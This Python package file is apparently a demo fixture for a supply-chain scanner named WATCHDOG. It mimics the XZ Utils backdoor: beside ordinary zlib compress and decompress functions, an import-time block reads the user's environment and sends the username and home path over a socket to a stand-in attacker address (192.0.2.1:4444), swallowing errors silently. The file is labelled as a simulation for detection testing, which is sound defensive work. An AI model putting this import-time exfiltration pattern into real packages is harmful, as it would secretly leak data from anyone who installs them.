"""
vuln_app/computil/__init__.py
------------------------------
WATCHDOG DEMO — Simulated malicious supply chain package.

This file mimics the behavioral fingerprint of the XZ Utils 2024 attack:
  - Imports socket and base64 (unusual for a compression utility)
  - Calls base64.b64decode on a hardcoded payload at import time
  - Opens a socket connection (would be to attacker C2 in a real attack)
  - Accesses os.environ to check the runtime environment
  - Writes to a path outside the package directory

In the real XZ Utils attack, this code was hidden inside binary test-data
files and decoded at build time.  Here we expose it plainly for demo clarity.

The maintainer metadata (data/metadata/maintainer_fake.json) will show:
  - maintainer: ji-chen-xu
  - account_age_days: 22
  - commits: 1
  - previous maintainers with 10+ years of history
→ Trust Analyst will assign provenance_score < 30 (CRITICAL risk).
"""

import base64
import os
import socket

# ── Legitimate-looking public API ─────────────────────────────────────────────

__version__ = "2.1.1"
__author__ = "ji-chen-xu"


def compress(data: bytes) -> bytes:
    """Compress *data* using zlib (legitimately)."""
    import zlib
    return zlib.compress(data)


def decompress(data: bytes) -> bytes:
    """Decompress *data* using zlib (legitimately)."""
    import zlib
    return zlib.decompress(data)


# ── BACKDOOR — executes silently at import time ───────────────────────────────
# In the real attack this block was obfuscated inside binary test files.
# Here it is left readable for the WATCHDOG demo.

_PAYLOAD = base64.b64decode(
    b"aGVsbG8gZnJvbSBjb21wdXRpbCBiYWNrZG9vcg=="  # "hello from computil backdoor"
)

_HOME = os.environ.get("HOME", "/tmp")
_USER = os.environ.get("USER", "unknown")

try:
    # Attempt exfiltration: open socket to attacker C2
    # (In the demo this immediately fails — no real attacker server running)
    _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _s.settimeout(0.5)
    _s.connect(("192.0.2.1", 4444))          # 192.0.2.1 = TEST-NET (RFC 5737), safe
    _s.send(f"uid={_USER}&home={_HOME}&payload={_PAYLOAD!r}".encode())
    _s.close()
except OSError:
    pass  # Silently swallow connection failure — typical malware behaviour
